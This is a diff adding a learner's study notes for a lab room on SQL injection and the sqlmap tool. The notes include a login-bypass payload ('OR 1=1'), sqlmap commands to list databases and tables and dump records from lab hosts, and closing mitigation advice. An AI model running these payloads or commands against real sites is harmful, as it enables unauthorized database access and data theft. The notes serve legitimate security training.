@@ -1,1 +1,140 @@
 # Room 37 SQLMap: The Basics
+
+## Task 1 Introduction
+
+Objective: Identify fundamentals of SQL injection and databases.
+SQL injection is a prevalent vulnerability in cybersecurity. 
+To understand it, we must first learn how databases work and how websites interact with them.
+A database is a structured collection of data, managed by DBMS (MySQL, PostgreSQL, SQLite, SQL Server).
+Websites use SQL queries to store, modify, and retrieve data.
+Example: login pages validate credentials against stored records.
+Search fields query the database to fetch and display results.
+Learning goals:
+- Understand SQL injection vulnerability.
+- Learn how to exploit SQL injection using SQLMap.
+- Room prerequisites:
+- SQL fundamentals are helpful but not required.
+
+---
+
+## Task 2 SQL Injection Vulnerability
+
+Objective: Understand how SQL queries can be exploited.
+Websites interact with databases using SQL queries. 
+If input is not properly sanitized, attackers can manipulate queries to perform malicious actions.
+Example of normal login query:
+Code
+- SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
+Example of SQL injection:  
+Username: John  
+Password: abc' OR 1=1;-- -
+Resulting query:
+Code
+- SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
+OR 1=1 always evaluates true.
+-- - comments out the rest of the query.
+Attacker bypasses authentication and logs in as John without knowing his password.
+Key point:
+- The single quote ' after abc closes the string, allowing injection of logical conditions.
+- Poor input validation makes applications vulnerable.
+
+---
+
+## Task 3 Automated SQL Injection Tool
+
+Objective: Learn how SQLMap automates SQL injection exploitation.
+SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.
+Key features:
+Detects multiple injection types: boolean-based blind, error-based, time-based blind, UNION query.
+Flags:
+- --wizard → guided interface for beginners.
+- --dbs → extract database names.
+- -D database_name --tables → list tables in a database.
+- -D database_name -T table_name --dump → dump records from a table.
+- --cookie → include session cookies for authenticated testing.
+Example vulnerable URL:
+Code
+- http://sqlmaptesting.thm/search?cat=1
+Basic test command:
+Code
+- sqlmap -u http://sqlmaptesting.thm/search/cat=1
+Results:
+Parameter cat vulnerable to multiple SQL injection techniques.
+Backend DBMS: MySQL.
+Web server: Linux Ubuntu, Nginx, PHP 5.6.40.
+Extracting database names:
+Code
+- sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
+Result:
+Databases found: users, members.
+Extracting tables from users database:
+Code
+- sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
+Result:
+Tables: johnath, alexas, thomas.
+Dumping records from thomas table:
+Code
+- sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
+Result:
+Example entry:
+Date: 09/09/2024
+Name: Thomas THM
+Pass: testing
+POST-based testing:
+Save intercepted request as text file.
+Example:
+Code
+- sqlmap -r intercepted_request.txt
+
+---
+
+## Task 4 Practical Exercise
+
+Objective: Apply SQLMap in a vulnerable lab environment.
+Start AttackBox and Lab Machine.
+Vulnerable login page:
+Code
+- http://MACHINE_IP/ai/login
+Inspect network requests to capture GET parameters.
+Example vulnerable request:
+Code
+- http://MACHINE_IP/ai/includes/user_login?email=test&password=test
+Run SQLMap with captured URL:
+Code
+- sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --level=5
+Respond to prompts:
+- Skip non-MySQL payloads → y
+- Include all MySQL tests → y
+- Try random integer for UNION → y
+- Confirm vulnerable parameter → n
+
+---
+
+## Tools Used
+
+- SQLMap (automated SQL injection tool).
+- Databases: MySQL, PostgreSQL, SQLite, SQL Server.
+- Vulnerable web applications with GET/POST parameters.
+- Browser developer tools (to inspect requests).
+
+## Findings
+
+- SQLMap simplifies detection and exploitation of SQL injection.
+- Multiple injection techniques can be identified automatically.
+- Cookie-based and POST-based testing expand attack surface.
+- Extracting databases, tables, and records is straightforward with flags.
+
+## Mitigation / Best Practices
+
+- Validate and sanitize all user inputs.
+- Use parameterized queries (prepared statements).
+- Restrict database privileges to minimize impact.
+- Monitor logs for suspicious queries.
+- Deploy Web Application Firewalls (WAF) to block injection attempts.
+
+## Conclusion
+
+- SQLMap is a powerful tool for automating SQL injection exploitation.
+- It demonstrates how attackers can quickly enumerate and extract sensitive data.
+- Defenders must prioritize secure coding practices and input validation to prevent such attacks.
+- Understanding SQLMap helps both attackers (for testing) and defenders (for mitigation).
